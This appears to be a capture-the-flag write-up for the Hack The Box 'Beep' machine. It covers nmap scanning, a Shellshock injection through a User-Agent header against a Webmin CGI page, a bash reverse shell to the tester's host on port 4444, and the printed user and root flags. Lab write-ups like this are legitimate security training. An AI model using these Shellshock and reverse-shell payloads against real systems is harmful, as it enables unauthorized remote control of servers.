![Beep.PNG](/assets/Machines/Easy/Beep/Beep.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.7
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.7
```

**Output**
```bash
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
878/tcp   open  unknown
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4190/tcp  open  sieve
4445/tcp  open  upnotifyp
4559/tcp  open  hylafax
5038/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt
```


3. We have 2 web pages:
* `https://10.10.10.7/`

![elastix.PNG](/assets/Machines/Easy/Beep/elastix.PNG)


*  `https://10.10.10.7:10000/` 

![webmin.PNG](/assets/Machines/Easy/Beep/webmin.PNG)


4. If you visit **Webmin site** you can watch the file extension is **.cgi**

* **URL:** `https://10.10.10.7:10000/session_login.cgi`

* When you watch a file extension like **.cgi** | **.sh** | **.pl**, you can do `SHELL SHOCK ATTACK`

5. How apply ShellShock?

* First, open BurpSuite.
* Then, capture a request.

![req.PNG](/assets/Machines/Easy/Beep/req.PNG)


* Resource: [ShellShock - How use it](https://blog.cloudflare.com/inside-shellshock/)

6. Apply a test command.

+ Listen ICMP packets in interface **tun0** with `tcpdump`
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Beep]
└─# tcpdump -i tun0 icmp -n 
```

+ We will send an ICMP packet our machine attack.
    * **Command:** `User-Agent: () { :; }; ping -c 1 <tun0 IP>`

+ We recived ICMP packet.
```
09:19:09.537841 IP 10.10.14.33 > 10.10.10.7: ICMP echo reply, id 25624, seq 1, length 64
```

7. Then, execute a command to get a reverse shell.
* **Command:** `User-Agent: () { :; }; bash -c 'bash -i >& /dev/tcp/10.10.14.33/4444 0>&1'

Remember listen on port choosed previously.

**Output**
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Beep]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.10.7] 36804
bash: no job control in this shell
[root@beep webmin]#
```

8. Show **user flag**
```
[root@beep fanis]# cat /home/fanis/user.txt
d614b9ae722593a9b5bcd0cfcb7ebd21
```

---
---
### **Privileges Escalation** 💀

1. Reverse shell get previously is running how root user.
```
[root@beep /]# whoami
root
```

2. Show root flag.
```
[root@beep /]# cat /root/root.txt
e30a9c9aec0f4ff74f0b05b1cd6dc8f9
```